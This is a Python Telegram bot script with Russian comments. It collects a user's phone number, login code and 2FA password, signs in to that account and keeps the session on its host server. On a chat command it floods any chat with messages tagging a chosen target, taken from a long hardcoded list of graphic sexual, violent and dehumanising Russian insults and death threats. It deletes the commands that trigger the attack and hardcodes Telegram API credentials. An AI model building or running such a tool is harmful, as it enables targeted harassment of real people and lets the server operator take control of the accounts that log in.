import asyncio
import os
import random
import aiohttp
from threading import Thread
from http.server import HTTPServer, BaseHTTPRequestHandler
from telethon import TelegramClient, events
from telethon.errors import FloodWaitError, SessionPasswordNeededError
from telethon.tl.custom import Button

# ========== КОНФИГ ==========
API_ID = 39163151
API_HASH = '3c0e92ad7b268eca1eb1a33a9baa7d1d'
BOT_TOKEN = os.environ.get('BOT_TOKEN', 'YOUR_BOT_TOKEN_HERE')

SESSION_DIR = "sessions"
if not os.path.exists(SESSION_DIR):
    os.makedirs(SESSION_DIR)

# ========== ЗАГЛУШКА ДЛЯ RENDER (ЧТОБЫ НЕ РУГАЛСЯ) ==========
class SimpleHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'Bot is running!')
    def log_message(self, format, *args):
        pass

def run_webserver():
    port = int(os.environ.get('PORT', 10000))
    server = HTTPServer(('0.0.0.0', port), SimpleHandler)
    server.serve_forever()

Thread(target=run_webserver, daemon=True).start()

# ========== КЛИЕНТ БОТА (ДЛЯ АВТОРИЗАЦИИ) ==========
auth_client = TelegramClient(
    os.path.join(SESSION_DIR, 'bot_session'),
    API_ID,
    API_HASH
).start(bot_token=BOT_TOKEN)

# ========== ПЕРЕМЕННЫЕ ДЛЯ ТВОЕГО АККАУНТА ==========
user_client = None
user_auth_data = {}
active_attacks = {}

# ========== КЛАВИАТУРА ДЛЯ КОДА ==========
def get_digit_keyboard():
    return [
        [Button.inline("1"), Button.inline("2"), Button.inline("3")],
        [Button.inline("4"), Button.inline("5"), Button.inline("6")],
        [Button.inline("7"), Button.inline("8"), Button.inline("9")],
        [Button.inline("0"), Button.inline("◀️"), Button.inline("✅")]
    ]

def get_clear_keyboard():
    return Button.clear()

# ========== ВСЕ ОСКОРБЛЕНИЯ (КОРОТКИЕ, С ФАНТАЗИЕЙ) ==========
lines_list = [
"я твою мать ебал",
"я твою мать ебал в жопу",
"я твою мать ебал в рот",
"я твою мать ебал в глотку",
"я твою мать ебал в пизду",
"я твою мать ебал в анал",
"я твою мать ебал до крови",
"я твою мать ебал до гноя",
"я твою мать ебал до мяса",
"я твою мать ебал до костей",
"я твою мать ебал до кишок",
"я твою мать ебал шлангом",
"я твою мать ебал ломом",
"я твою мать ебал арматурой",
"твоя мать шалава",
"твоя мать блядина",
"твоя мать падаль",
"твоя мать мусорная яма",
"твоя мать сосет у параши",
"твоя мать лижет у помойки",
"твоя мать глотает в подворотне",
"твоя мать кончает под забором",
"твоя мать дрочит на вокзале",
"твоя мать отсасывает за спайс",
"твоя мать мастурбирует в морге",
"твой отец пьет мочу",
"твой отец спит с козой",
"твой отец лижет пол",
"твой отец сосет у бомжей",
"твой отец продал паспорт",
"твой отец кончил в себя",
"твоя бабка шлюха века",
"твоя бабка ебется с дедом",
"твоя бабка сосет сквозь гроб",
"твоя сестра даёт за чипсы",
"твоя сестра сосет в подвале",
"твоя сестра ложится под всех",
"твой брат петух конченый",
"твой брат дрочит на школу",
"твой брат импотент хуев",
"ты гнойный мешок",
"ты недоносок",
"ты выкидыш",
"ты ссанье подзаборное",
"ты фекальная масса",
"ты мокрота из мамкиной матки",
"ты отребье человеческое",
"ты гниющий труп",
"ты биомусор",
"ты ублюдок конченый",
"ты мразь ебанная",
"ты тварь дрожащая",
"ты гнида вшивая",
"ты пиздюк петушиный",
"ты ссыкло безъяйцевое",
"ты импотент хуев",
"ты даже стоять не можешь",
"ты даже на коленях говно",
"ты трясешься как заяц",
"ты боишься собственной тени",
"ты хуже любой бляди",
"ты хуже помойной крысы",
"ты даже на органы не годен",
"ты пустое место",
"ты ноль без палки",
"ты даже хуже нуля",
"я ломал твои ребра об асфальт",
"я выбивал твои зубы о бордюр",
"я проламывал твой череп о стену",
"я вырывал твой язык об унитаз",
"я отрубал твои пальцы",
"я раздроблял твои колени",
"я выкалывал твои глаза ломом",
"я сломал твою челюсть",
"я перебил тебе позвоночник",
"я разорвал тебе сухожилия",
"я сжег твою морду кислотой",
"я отрезал тебе уши",
"я забил твою глотку грязью",
"я засунул твою башку в унитаз",
"я твою рожу об асфальт тер",
"я твои кости собакам скормил",
"а ты даже не рыпнулся",
"а ты даже мать не защитил",
"ты просто смотрел как ее трахают",
"ты стоял в углу и дрочил",
"ты кончал в штаны от страха",
"ты обоссался когда я посмотрел",
"ты обосрался когда я кашлянул",
"ты ссыкло конченое с детства",
"ты тряпка без воли",
"ты мешок без яиц",
"ты кусок дерьма в оболочке",
"потому что ты никто",
"потому что ты ничто",
"я твой бог",
"я твой палач",
"я твой судья",
"я твоя смерть",
"ты умрешь в грязи",
"ты сдохнешь под забором",
"тебя сожрут черви",
"тебя размажут по асфальту",
"ты даже могилы не заслужишь",
"тебя закопают на свалке",
"и никто не придет",
"никто не вспомнит",
"потому что ты никто и звать тебя никак"
]

# ========== КАПС-ФРАЗЫ ==========
boss_lines = [
    "Я БОСС, ТЫ ТЕРПИШЬ",
    "ТЫ ПРОИГРАЛ",
    "Я ЗДЕСЬ ГЛАВНЫЙ",
    "ТВОЯ РОЛЬ — СКУЛИТЬ",
    "Я КОМАНДУЮ",
    "ТЫ ПОВИНУЕШЬСЯ",
    "Я БОСС",
    "ТЫ НИКТО",
    "МОЯ ВЛАСТЬ",
    "ТЫ ТОЛЬКО ТЕРПИШЬ"
]

# ========== АТАКА (БЕЗ ЗАДЕРЖКИ) ==========
async def attack_loop(user_id, target, chat_id, stop_event):
    global user_client
    if not user_client:
        return
    
    counter = 0
    while not stop_event.is_set():
        for line in lines_list:
            if stop_event.is_set():
                break
            
            try:
                await user_client.send_message(chat_id, f'@{target} {line}')
            except FloodWaitError as e:
                await asyncio.sleep(e.seconds)
            except:
                pass
            
            counter += 1
            
            if counter % random.randint(2, 3) == 0:
                boss_msg = random.choice(boss_lines)
                try:
                    await user_client.send_message(chat_id, f'@{target} {boss_msg}')
                except FloodWaitError as e:
                    await asyncio.sleep(e.seconds)
                except:
                    pass

# ========== АВТОРИЗАЦИЯ ==========
@auth_client.on(events.NewMessage)
async def handle_auth(event):
    global user_client
    user_id = event.sender_id
    text = event.raw_text.strip()
    chat_id = event.chat_id

    if chat_id != user_id:
        return

    if text == '/start':
        if user_client and await user_client.is_connected():
            await event.reply("✅ Уже авторизован. Пиши .байт @username")
            return
        buttons = [[Button.request_phone("📱 Поделиться номером", resize=True)]]
        await event.reply("🔐 Отправь номер", buttons=buttons)
        return

    if event.contact:
        phone = event.contact.phone_number
        if not phone:
            return
        if user_id in user_auth_data:
            return
        
        session_path = os.path.join(SESSION_DIR, f'user_{user_id}')
        user_client = TelegramClient(session_path, API_ID, API_HASH)
        await user_client.connect()
        try:
            result = await user_client.send_code_request(phone)
            user_auth_data[user_id] = {
                'phone': phone,
                'phone_code_hash': result.phone_code_hash,
                'state': 'code_waiting',
                'temp_input': ''
            }
            await event.reply(f"✅ Код на {phone[-4:]}\n\nВведи код:", buttons=get_digit_keyboard())
        except Exception as e:
            await event.reply(f"❌ {e}")
        return

# ========== INLINE КНОПКИ ==========
@auth_client.on(events.CallbackQuery)
async def callback(event):
    global user_client
    user_id = event.sender_id
    data = event.data.decode('utf-8')
    
    if user_id not in user_auth_data:
        await event.answer("Нажми /start", alert=True)
        return
    
    auth = user_auth_data[user_id]
    
    if auth['state'] == 'code_waiting':
        if data == '✅':
            code = auth.get('temp_input', '')
            if len(code) < 3:
                await event.answer("Короткий код", alert=True)
                return
            try:
                await user_client.sign_in(
                    phone=auth['phone'],
                    code=code,
                    phone_code_hash=auth['phone_code_hash']
                )
                del user_auth_data[user_id]
                await event.edit("✅ Авторизован!\n\n.байт @username", buttons=get_clear_keyboard())
                
                @user_client.on(events.NewMessage)
                async def handle_command(event):
                    global user_client
                    sender = event.sender_id
                    text = event.raw_text.strip()
                    chat = event.chat_id
                    
                    if sender == (await user_client.get_me()).id:
                        return
                    
                    if text.startswith('.байт '):
                        parts = text.split()
                        if len(parts) < 2:
                            return
                        target = parts[1].replace('@', '')
                        key = f"{target}_{chat}"
                        if key not in active_attacks:
                            stop = asyncio.Event()
                            task = asyncio.create_task(attack_loop(sender, target, chat, stop))
                            active_attacks[key] = (task, stop)
                        await event.delete()
                        return
                    
                    if text.startswith('.байтстоп '):
                        parts = text.split()
                        if len(parts) < 2:
                            return
                        target = parts[1].replace('@', '')
                        key = f"{target}_{chat}"
                        if key in active_attacks:
                            task, stop = active_attacks[key]
                            stop.set()
                            task.cancel()
                            del active_attacks[key]
                        await event.delete()
                        return
                
                await user_client.run_until_disconnected()
            except SessionPasswordNeededError:
                auth['state'] = 'password_waiting'
                auth['temp_input'] = ''
                await event.edit("🔐 Введи 2FA пароль:", buttons=get_digit_keyboard())
            except Exception as e:
                await event.edit(f"❌ {e}", buttons=get_clear_keyboard())
                del user_auth_data[user_id]
        elif data == '◀️':
            auth['temp_input'] = auth.get('temp_input', '')[:-1]
            display = f"Код:\n`{auth['temp_input']}`" if auth['temp_input'] else "Введи код:"
            await event.edit(display, buttons=get_digit_keyboard())
        elif data.isdigit():
            auth['temp_input'] = auth.get('temp_input', '') + data
            display = f"Код:\n`{auth['temp_input']}`" if auth['temp_input'] else "Введи код:"
            await event.edit(display, buttons=get_digit_keyboard())
    
    elif auth['state'] == 'password_waiting':
        if data == '✅':
            pwd = auth.get('temp_input', '')
            if len(pwd) < 1:
                await event.answer("Введи пароль", alert=True)
                return
            try:
                await user_client.sign_in(password=pwd)
                del user_auth_data[user_id]
                await event.edit("✅ Авторизован!\n\n.байт @username", buttons=get_clear_keyboard())
                
                @user_client.on(events.NewMessage)
                async def handle_command(event):
                    global user_client
                    sender = event.sender_id
                    text = event.raw_text.strip()
                    chat = event.chat_id
                    
                    if sender == (await user_client.get_me()).id:
                        return
                    
                    if text.startswith('.байт '):
                        parts = text.split()
                        if len(parts) < 2:
                            return
                        target = parts[1].replace('@', '')
                        key = f"{target}_{chat}"
                        if key not in active_attacks:
                            stop = asyncio.Event()
                            task = asyncio.create_task(attack_loop(sender, target, chat, stop))
                            active_attacks[key] = (task, stop)
                        await event.delete()
                        return
                    
                    if text.startswith('.байтстоп '):
                        parts = text.split()
                        if len(parts) < 2:
                            return
                        target = parts[1].replace('@', '')
                        key = f"{target}_{chat}"
                        if key in active_attacks:
                            task, stop = active_attacks[key]
                            stop.set()
                            task.cancel()
                            del active_attacks[key]
                        await event.delete()
                        return
                
                await user_client.run_until_disconnected()
            except Exception:
                await event.answer("Неверный пароль", alert=True)
                auth['temp_input'] = ''
                await event.edit("🔐 Неверный пароль, попробуй снова:", buttons=get_digit_keyboard())
        elif data == '◀️':
            auth['temp_input'] = auth.get('temp_input', '')[:-1]
            display = f"Пароль:\n`{auth['temp_input']}`" if auth['temp_input'] else "Введи 2FA:"
            await event.edit(display, buttons=get_digit_keyboard())
        elif data.isdigit():
            auth['temp_input'] = auth.get('temp_input', '') + data
            display = f"Пароль:\n`{auth['temp_input']}`" if auth['temp_input'] else "Введи 2FA:"
            await event.edit(display, buttons=get_digit_keyboard())

# ========== САМОПИНГ (НЕ ДАЁМ RENDER ЗАСНУТЬ) ==========
async def keep_alive():
    host = os.environ.get('RENDER_EXTERNAL_HOSTNAME', 'localhost')
    url = f"https://{host}" if host != 'localhost' else "http://localhost:10000"
    while True:
        await asyncio.sleep(240)  # каждые 4 минуты
        try:
            async with aiohttp.ClientSession() as session:
                await session.get(url)
                print("🔄 Пинг отправлен, бодрствую")
        except Exception as e:
            print(f"Пинг не удался: {e}")

# ========== ЗАПУСК ==========
async def main():
    await auth_client.start()
    me = await auth_client.get_me()
    print(f'✅ Бот: @{me.username}')
    print('👉 Напиши боту /start, авторизуй свой аккаунт')
    print('👉 После авторизации пиши .байт @username в ЛЮБОМ чате')
    print('👉 Команды удаляются, атака без задержки')
    
    # Запускаем пинг в фоне
    asyncio.create_task(keep_alive())
    
    await auth_client.run_until_disconnected()

with auth_client:
    auth_client.loop.run_until_complete(main())
